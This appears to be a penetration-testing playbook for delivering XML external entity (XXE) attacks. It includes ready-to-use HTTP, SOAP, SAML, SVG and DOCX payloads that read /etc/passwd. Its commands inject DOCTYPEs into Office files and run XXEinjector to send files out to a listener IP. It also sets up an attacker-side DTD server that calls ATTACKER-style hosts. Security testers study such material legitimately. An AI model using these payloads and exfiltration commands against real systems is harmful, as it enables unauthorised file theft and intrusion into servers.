# XXE Delivery Vectors — Content-Type Pivots, Uploads, SOAP/SAML, Tooling

## 1. Content-type pivots

Many frameworks content-negotiate the request body. For every JSON/form
endpoint, resend with XML:

Original:

```
POST /api/user HTTP/1.1
Host: example.com
Content-Type: application/json

{"name":"vulture","email":"a@example.net"}
```

Pivot:

```
POST /api/user HTTP/1.1
Host: example.com
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><name>&xxe;</name><email>a@example.net</email></root>
```

Signals: a 200/validation error that references your XML field names = the
pivot works; `org.xml.sax.SAXParseException`, `libxml`, `System.Xml`,
`XmlPullParser` in the error = parser identified. Try `text/xml` and
`application/soap+xml` too; some stacks sniff the body regardless of the
header, so also try the XML body *with the original JSON content-type*.

Reflected-field choice: mirror the JSON structure 1:1 so the app's normal
response echoes a field you control — that becomes your in-band read channel.

## 2. SOAP

DOCTYPE goes above the Envelope; put the entity in a parameter the response
echoes (fault messages often echo too):

```xml
<?xml version="1.0"?>
<!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser xmlns="http://example.com/api"><id>&xxe;</id></GetUser>
  </soap:Body>
</soap:Envelope>
```

Enumerate operations from `?wsdl`. If general entities are rejected inside the
Body, fall back to parameter-entity OOB probes (payloads.md §1).

## 3. SAML

`SAMLResponse`/`SAMLRequest` is base64 (POST binding) or
deflate+base64+urlencode (redirect binding). Decode, prepend the DOCTYPE
before `<samlp:Response ...>`, re-encode, resubmit. Even when signature
validation later fails, many stacks *parse before verifying* — the OOB probe
fires anyway. Blind-only here: use the parameter-entity OOB probe and
error-based exfil.

## 4. SVG upload

SVG is XML. Any uploader that parses/rasterizes/thumbnails SVG is a sink:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="900" height="600">
  <text font-size="14" x="10" y="20">&xxe;</text>
</svg>
```

The file content renders *into the output image* — fetch the generated
thumbnail/preview and read (or OCR) it. If the SVG is only stored and served,
the entity may resolve client-side-never — use the OOB probe variant
(`SYSTEM "http://u-svg.ATTACKER/x"`) to test the server-side parser. Also try
SVG inside other flows: avatar upload, HTML-to-PDF converters
(`<img src="x.svg">`), chart/diagram imports.

## 5. Office documents (DOCX/XLSX/PPTX = zip of XML)

```
mkdir d && cd d && unzip ../clean.docx
# inject DOCTYPE as the FIRST lines of an XML member that is always parsed:
#   [Content_Types].xml  (parsed earliest)  or  word/document.xml  /  xl/workbook.xml
sed -i '1a <!DOCTYPE r [<!ENTITY % p SYSTEM "http://u-docx.ATTACKER/x"> %p;]>' word/document.xml
zip -r ../evil.docx '[Content_Types].xml' _rels docProps word   # keep structure; store [Content_Types].xml first
```

Upload wherever documents are parsed server-side (import, preview, indexing,
mail-merge). OOB probe first — in-band reflection is rare for doc parsing.
Same trick for XLSX (`xl/workbook.xml`, `xl/sharedStrings.xml`) and ODT
(`content.xml`). Excel-specific automation: the `oxml_xxe` tool.

## 6. Other sinks

- RSS/Atom feed importers: host a feed whose XML carries the DOCTYPE; point
  the importer at `http://ATTACKER/feed.xml`.
- Sitemap/`.xml` fetchers, EPUB, KML/GPX uploads, XML config imports,
  `xmlrpc.php`.
- `X-Forwarded-*`-style API gateways that transform JSON→XML internally
  (observed via error strings).

## 7. XXEinjector (automated blind XXE / exfil)

Ruby tool (enjoiz/XXEinjector). Feed it a request file with `XXEINJECT` marking
where the DTD reference goes:

```
# req.txt: raw request, body contains the line  XXEINJECT
ruby XXEinjector.rb --host=198.51.100.7 --file=req.txt \
     --path=/etc/passwd --oob=http --verbose

--host=IP            your listener IP (serves DTD, receives exfil)
--file=req.txt       raw request template (XXEINJECT marker)
--path=/etc/passwd   file or directory to retrieve (dirs: Java only)
--oob=http|ftp|gopher   exfil channel; ftp handles multiline on Java
--phpfilter          wrap in php://filter base64 (PHP targets, multiline fix)
--enum=write         enumeration/upload modes; --brute=paths.txt file brute
--xslt / --cdata / --unfiltered-port=PORT ...
```

Retrieved files land in `Logs/<host>/`. Feed confirmed reads into
`gen_xxe.py --results` for rupu reporting.

## 8. Burp Suite

- Scanner (Pro) has dedicated XXE + Collaborator-based blind-XXE checks: send
  every captured XML request to an active audit
  (`Audit checks - medium active` or better); via REST API:
  `POST http://127.0.0.1:1337/<key>/v0.1/scan` with the XML URLs.
- Repeater for manual payload iteration; Intruder (Sniper) over a §file-path
  position to brute target files; Collaborator client as the interactsh
  alternative for OOB.
- "Content Type Converter" BApp automates the JSON→XML pivot.

## 9. Hosting the attacker side

```
# DTD + exfil catcher (logs querystrings):
cd payloads/ && python3 -m http.server 80
# or let gen_xxe.py print a ready-made one-file server:
python3 scripts/gen_xxe.py --callback 198.51.100.7 --file /etc/passwd --out payloads/
# interactsh for DNS/HTTP evidence with JSONL logs:
interactsh-client -json -o oast.jsonl -v
```

Remember: the DTD host must be reachable from the *target*; when only DNS
egress exists, you still get the DNS interaction (proof) but must switch to
error-based or local-DTD techniques for data (payloads.md §5).
